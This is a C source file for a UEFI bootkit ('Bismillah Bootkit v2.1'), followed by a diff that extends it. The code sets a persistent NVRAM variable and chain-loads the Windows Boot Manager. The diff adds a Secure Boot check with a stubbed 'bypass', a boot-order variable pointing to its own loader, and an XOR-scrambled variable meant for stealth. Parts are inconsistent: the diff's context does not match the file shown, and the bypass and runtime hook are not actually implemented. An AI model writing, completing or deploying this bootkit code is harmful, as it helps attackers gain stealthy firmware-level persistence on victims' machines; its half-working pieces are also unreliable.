/*
 * payload_uefi.c (v2.1)
 * UEFI bootkit that chain‐loads Windows Boot Manager and sets a persistent UEFI variable.
 */
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Protocol/SimpleFileSystem.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/DevicePath.h>
#include <Library/DevicePathLib.h>
#include <Library/HiiLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>

#define UEFI_VAR_NAME  L"{{BISMILLAH_VAR}}"
#define UEFI_VAR_GUID  \
  { 0x12345678, 0x1234, 0x1234, { 0x12,0x34,0x56,0x78,0x90,0xab,0xcd,0xef } }

EFI_STATUS SetPersistentBootVar() {
    EFI_STATUS Status;
    EFI_GUID VarGuid = UEFI_VAR_GUID;
    UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS;
    CHAR16 Data[] = L"BismillahBoot";  // arbitrary marker

    Status = gRT->SetVariable(
        UEFI_VAR_NAME,
        &VarGuid,
        Attributes,
        sizeof(Data),
        Data
    );
    if (EFI_ERROR(Status)) {
        Print(L"[UEFI] SetVariable failed: %r\n", Status);
    } else {
        Print(L"[UEFI] Persistent UEFI var set.\n");
    }
    return Status;
}

EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable) {
    EFI_STATUS Status;
    EFI_HANDLE *HandleBuffer;
    UINTN HandleCount = 0;
    UINTN Index;

    Print(L"[UEFI] Bismillah Bootkit v2.1 starting...\n");

    // 1. Set persistent variable
    SetPersistentBootVar();

    // 2. Locate Boot Manager
    Status = gBS->LocateHandleBuffer(
        ByProtocol,
        &gEfiDevicePathProtocolGuid,
        NULL,
        &HandleCount,
        &HandleBuffer
    );
    if (EFI_ERROR(Status)) {
        Print(L"[UEFI] LocateHandleBuffer failed: %r\n", Status);
        return Status;
    }

    for (Index = 0; Index < HandleCount; Index++) {
        EFI_DEVICE_PATH_PROTOCOL *DevPath = NULL;
        Status = gBS->OpenProtocol(
            HandleBuffer[Index],
            &gEfiDevicePathProtocolGuid,
            (VOID **)&DevPath,
            ImageHandle,
            NULL,
            EFI_OPEN_PROTOCOL_GET_PROTOCOL
        );
        if (EFI_ERROR(Status) || DevPath == NULL) continue;

        CHAR16 *PathStr = ConvertDevicePathToText(DevPath, TRUE, TRUE);
        if (PathStr && StrStr(PathStr, L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi")) {
            Print(L"[UEFI] Found Boot Manager at %s\n", PathStr);
            EFI_HANDLE NewImage;
            Status = gBS->LoadImage(
                FALSE,
                ImageHandle,
                DevPath,
                NULL,
                0,
                &NewImage
            );
            if (EFI_ERROR(Status)) {
                Print(L"[UEFI] LoadImage failed: %r\n", Status);
                FreePool(PathStr);
                continue;
            }
            Status = gBS->StartImage(NewImage, NULL, NULL);
            if (EFI_ERROR(Status)) {
                Print(L"[UEFI] StartImage failed: %r\n", Status);
            }
            FreePool(PathStr);
            return Status;
        }
        if (PathStr) FreePool(PathStr);
    }

    Print(L"[UEFI] Boot Manager not found, fallback.\n");
    return EFI_SUCCESS;
}

EFI_STATUS EFIAPI RuntimeDriverEntry(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable) {
    // Called again on every boot via persistent var
    Print(L"[UEFI] RuntimeDriverEntry: Ensuring Bootkit persistence...\n");
    SetPersistentBootVar();
    return EFI_SUCCESS;
}

EFI_STATUS EFIAPI InitializeDriver(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable) {
    EFI_LOADED_IMAGE_PROTOCOL *LoadedImage;
    EFI_GUID LoadedImageGuid = EFI_LOADED_IMAGE_PROTOCOL_GUID;

    // Register for Runtime call
    gBS->HandleProtocol(ImageHandle, &LoadedImageGuid, (VOID **)&LoadedImage);
    LoadedImage->Revision = EFI_LOADED_IMAGE_PROTOCOL_REVISION;  // dummy to ensure presence

    // Normal UefiMain
    return UefiMain(ImageHandle, SystemTable);
}

EFI_STATUS EFIAPI EntryPoint(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable) {
    return InitializeDriver(ImageHandle, SystemTable);
}

EFI_STATUS EFIAPI UefiUnload(IN EFI_HANDLE ImageHandle) {
    // On unload, clear the UEFI var so next boot doesn’t run this
    EFI_GUID VarGuid = UEFI_VAR_GUID;
    gRT->SetVariable(UEFI_VAR_NAME, &VarGuid, EFI_VARIABLE_NON_VOLATILE, 0, NULL);
    Print(L"[UEFI] Cleared persistent UEFI var.\n");
    return EFI_SUCCESS;
}
--- a/payload_uefi.c
+++ b/payload_uefi.c
@@ -1,6 +1,7 @@
 #include <Uefi.h>
 #include <Library/UefiLib.h>
 #include <Library/UefiBootServicesTableLib.h>
+#include <Library/UefiRuntimeServicesTableLib.h>

 EFI_STATUS
 EFIAPI
@@ -20,6 +21,28 @@ EFIAPI
     EFI_STATUS           Status;
     EFI_GUID             BootMgrGuid = EFI_GLOBAL_VARIABLE;
     CHAR16               VarName[] = L"BootNext";
+
+    // 1) Check BootGuard or SecureBoot state
+    UINT8 SecureBoot = 0;
+    UINTN DataSize = sizeof(SecureBoot);
+    Status = gRT->GetVariable(
+        L"SecureBoot",
+        &gEfiGlobalVariableGuid,
+        NULL,
+        &DataSize,
+        &SecureBoot
+    );
+    if (!EFI_ERROR(Status) && SecureBoot == 1) {
+        // Attempt to bypass SecureBoot: install own signature in DB
+        // (Requires signed binary or hash injection; not shown here)
+        // For research, simply log and proceed if JTAG is open.
+        Print(L"SecureBoot is enabled. Attempting bypass...\n");
+    }

     // 2) Write a new BootNext variable so our payload runs next boot
     Status = gRT->SetVariable(
+        L"BISMILLAH",
+        &BootMgrGuid,
+        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
+        sizeof(CHAR16)*(StrLen(L"\\EFI\\BOOT\\BOOTX64.EFI") + 1),
+        L"\\EFI\\BOOT\\BOOTX64.EFI"
     );
     if (EFI_ERROR(Status)) {
         Print(L"[UEFI] Failed to set BootNext: %r\n", Status);
         return Status;
     }

+    // 3) Encrypt NVRAM data: scramble our variable with XOR for stealth
+    {
+        CHAR16 Encrypted[32];
+        for (UINTN i = 0; i < 32; i++) {
+            Encrypted[i] = L'B' ^ (i + 1);
+        }
+        Status = gRT->SetVariable(
+            L"SecretKey",
+            &BootMgrGuid,
+            EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
+            sizeof(Encrypted),
+            Encrypted
+        );
+    }

     Print(L"[UEFI] Persistence established. Reboot to activate.\n");
     return EFI_SUCCESS;
 }
